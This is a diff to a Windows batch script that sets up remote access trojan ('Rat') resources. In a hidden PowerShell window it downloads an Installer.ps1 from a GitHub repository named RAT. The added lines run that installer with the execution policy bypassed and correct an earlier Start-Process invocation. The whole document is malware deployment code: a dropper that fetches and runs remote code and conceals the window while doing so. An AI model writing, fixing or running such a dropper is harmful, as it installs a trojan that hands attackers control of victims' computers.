@@ -31,4 +31,5 @@ if '%errorlevel%' NEQ '0' (
 
 REM Rat resources
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/Installer.ps1 -OutFile Installer.ps1"
-powershell Start-Process -ep bypass -c "./Installer.ps1"
+powershell -ep bypass -c "./Installer.ps1"
+pause
